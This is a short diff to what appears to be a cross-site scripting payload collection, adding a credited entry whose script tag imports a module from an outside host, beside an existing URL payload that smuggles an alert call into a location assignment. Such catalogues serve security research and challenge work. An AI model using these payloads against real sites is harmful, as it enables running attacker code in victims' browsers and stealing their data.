@@ -351,6 +351,13 @@ xss.html
 
 ---
 
+
+[Brute Logic](https://x.com/BRuteLogic/status/1736746297204347373)
+
+    <Script Type=Module>import"//X55.is"</Script>
+
+---
+
 [mage_1868 ](https://github.com/cure53/XSSChallengeWiki/wiki/ES6-Challenge)
 
     location="https://example.com/xss.html/.source;alert(23)?xss="
